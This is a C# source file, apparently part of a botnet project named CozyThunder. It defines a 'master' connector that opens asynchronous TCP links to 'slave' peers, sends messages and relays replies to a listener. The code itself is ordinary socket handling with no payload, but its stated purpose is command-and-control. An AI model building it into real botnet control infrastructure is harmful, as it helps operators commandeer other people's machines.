using CozyThunder.Botnet.Common;
using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;

namespace CozyThunder.Botnet.Master
{
    // 每一个MasterConnector作为一个tcp客户端，和一个SlavePeer进行连接
    class MasterConnector
    {
        IMasterConnectorListener listener_;
        Socket socket_;
        Peer peer_;

        public bool Connect(Peer peer, IMasterConnectorListener listener)
        {
            peer_ = peer;
            listener_ = listener;
            socket_ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket_.SendTimeout = 1000 * 10;
            socket_.ReceiveTimeout = 1000 * 10;
            socket_.SendBufferSize = 1024 * 4;
            socket_.ReceiveBufferSize = 1024 * 4;
            socket_.BeginConnect(peer.EndPoint.Address, peer.EndPoint.Port, ConnectCallback, socket_);
            return true;
        }

        public bool DisConnect()
        {
            socket_?.Shutdown(SocketShutdown.Both);
            socket_?.Close();
            listener_?.OnDisConnect(peer_);
            return true;
        }

        public bool Send(string msg)
        {
            byte[] byteData = Encoding.ASCII.GetBytes(msg);
            socket_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), socket_);
            return true;
        }

        public bool Send(byte[] byteData)
        {
            socket_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), socket_);
            return true;
        }

        void ConnectCallback(IAsyncResult ar)
        {
            try
            {
                Socket client = (Socket)ar.AsyncState;
                client.EndConnect(ar);
                listener_?.OnConnect(peer_);

                StateObject state = new StateObject();
                state.workSocket = client;
                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, ReadCallback, state);
            }
            catch
            {
                int a = 3;
            }
        }

        void SendCallback(IAsyncResult ar)
        {
            Socket client = (Socket)ar.AsyncState;
            int bytesSent = client.EndSend(ar);
        }

        void ReadCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;
            try
            {
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead > 0)
                {
                    listener_?.OnMessage(peer_, state.buffer.Take(bytesRead).ToArray());
                }
                handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
            catch
            {
                listener_?.OnDisConnect(peer_);
            }
        }
    }
}
